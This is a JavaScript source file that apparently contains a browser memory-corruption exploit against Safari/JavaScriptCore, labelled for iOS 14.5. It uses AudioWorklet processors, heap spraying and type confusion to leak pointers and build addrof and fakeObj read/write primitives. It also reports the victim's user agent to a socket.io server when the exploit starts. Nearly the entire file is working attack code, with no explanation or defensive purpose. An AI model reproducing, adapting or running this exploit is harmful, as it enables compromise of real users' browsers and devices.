var socket = io.connect("/");

function sleep(sleepDuration) {
	var now = new Date().getTime();
	while (new Date().getTime() < now + sleepDuration) {
		/* do nothing */
	}
}

function gc() {
	for (let i = 0; i < 0x10; i++) {
		new ArrayBuffer(0x1000000);
	}
}

class OrigineWorklet extends AudioWorkletProcessor {
	constructor() {
		super();
		//var fuck2 = new AudioWorkletProcessor();
		return b;
	}
	static get parameterDescriptors() {
		return [];
	}
	process(inputs, outputs, parameters) {
		return false;
	}
}

class OrigineWorklet2 extends AudioWorkletProcessor {
	constructor() {
		super();
		//console.log(c);
		this.port.onmessage = (e) => {};

		fuck = this;
		//fuck.port.postMessage(c);
		return this;
	}
	static get parameterDescriptors() {
		return [
			{
				name: "param2",
				defaultValue: 0.1337,
			},
		];
	}
	process(inputs, outputs, parameters) {
		//
		//
		//this.port.postMessage(c);
		return false;
	}
}

function kickstart145() {
	socket.emit("exploit_start", {
		exploitVersion: "14.5",
		userAgent: navigator.userAgent,
	});
	let data_view = new DataView(new ArrayBuffer(8));
	var floatAsQword = (float) => {
		data_view.setFloat64(0, float, true);
		var low = data_view.getUint32(0, true);
		var high = data_view.getUint32(4, true);
		return low + high * 0x100000000;
	};

	var qwordAsTagged = (qword) => {
		return qwordAsFloat(qword - 0x02000000000000);
	};

	var qwordAsFloat = (qword) => {
		data_view.setUint32(0, qword % 0x100000000, true);
		data_view.setUint32(4, qword / 0x100000000, true);
		//data_view.setBigUint64(0, qword);
		return data_view.getFloat64(0, true);
	};

	function change_container(header, arr) {
		try {
		} catch {}
		for (var i = 0; i < 0x100000; i++) {
			ds[i].cellHeader = header;
			ds[i].butterfly = arr;
		}
	}

	const MY_OBJECT_OFFSET = 0x14fb0;
	//MakeJitCompiledFunction();
	//MakeJitCompiledFunction();

	var a = new Array(10);
	for (var i = 0; i < 0x1000; i++) a[i] = Array(0x40).fill(0.0);
	var b = Array(0x40).fill(0.0);
	var c = Array(0x40).fill(0.0);
	var ds = new Array(0x100000);

	let noCoW = 13.37;
	let pad = new Array(noCoW, 2.2, {}, 13.37);
	let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);
	let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);

	var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);

	var boxed = new Array(
		qwordAsTagged(0x41414141414141),
		noCoW,
		{},
		13.37,
		5.5,
		6.6,
		7.7,
		8,
		8
	);

	var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8, 8);
	var victim = [noCoW, 14.47, 15.57];
	victim["prop"] = 13.37;
	victim["prop_1"] = 13.37;
	let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8, 8);
	//var gcPreventer = [];
	var structure_id = 0;
	c[0] = 1.1;
	var fuck = undefined;
	var fuck2 = undefined;
	var driver = undefined;
	var stage = "leak";
	var jscell_header = undefined;
	var evil_arr_butterfly = undefined;
	var expected_ptr = undefined;
	eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);

	b.process = (inputs, outputs, parameters) => {
		//sa
		if (stage == "leak") {
			var expected_ptr =
				(BigInt(floatAsQword(c[4])) & 0xfffffffffff00000n) - 0x100000n;
			expected_ptr = Number(expected_ptr);
			c[8] = qwordAsFloat(expected_ptr + 0x4010);
			c[9] = qwordAsFloat(0x0);
			stage = "bypass_etc";
			fuck.port.postMessage(c);
			//sleep(4000);
			return true;
		} else if (stage == "bypass_etc") {
			//fuck.port.postMessage(typeof parameters);
			var gcPreventer = [];
			for (let i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : victim;
				gcPreventer.push(a[0]);
			}
			jscell_header = gcPreventer[0];

			var gcPreventer = [];
			for (let i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : victim;
				gcPreventer.push(a[1]);
			}
			evil_arr_butterfly = floatAsQword(gcPreventer[0]);

			structure_id = floatAsQword(jscell_header) & 0xffffffff;
			if (structure_id == 0) {
				fuck.port.postMessage(`retry`);

				c[8] = qwordAsFloat(0);
				parameters = null;
				//sleep(10000000);
				//stage = "leak";
				return false;
			}
			fuck.port.postMessage(
				`jscell header : ${floatAsQword(jscell_header).toString(16)}`
			);

			//fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
			//return false;
			var cellHeader = jscell_header; //qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
			//change_container(cellHeader, evil_arr);
			c[8] = qwordAsFloat(evil_arr_butterfly);
			evil_arr[0] = cellHeader;
			evil_arr[1] = qwordAsFloat(evil_arr_butterfly - 0x8);

			stage = "r/w";
			return true;
		} else if (stage == "r/w") {
			for (var i = 0; i < 2; i++) {
				let a = i == 0 ? parameters : pad;
				a[0] = qwordAsFloat(0x133700001337);
			}
			fuck.port.postMessage(
				`evil_arr length : ${evil_arr.length.toString(16)}`
			);
			evil_arr[0] = qwordAsFloat(0x00010100 * 0x100000000 + structure_id);
			evil_arr[1] = qwordAsFloat(0);
			var boxed_offset = 0;
			for (var i = 0; i < evil_arr.length; i++) {
				if (evil_arr[i] == qwordAsFloat(0x0041414141414140)) {
					//fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
					boxed_offset = i;
					break;
				}
			}
			var addrof = (obj) => {
				boxed[0] = obj;
				return floatAsQword(evil_arr[boxed_offset]);
			};
			var fakeObj = (addr) => {
				evil_arr[boxed_offset] = qwordAsFloat(addr);
				return boxed[0];
			};
			stage = "gc_test";
			return true;
		} else if (stage == "gc_test") {
			gc();
			fuck.port.postMessage("Garbage Collected");
			//sleep(100000);
			return false;
		}
		//  sleep(2000);
		return true;
	};
	registerProcessor("OrigineWorklet", OrigineWorklet);
	registerProcessor("OrigineWorklet2", OrigineWorklet2);
}
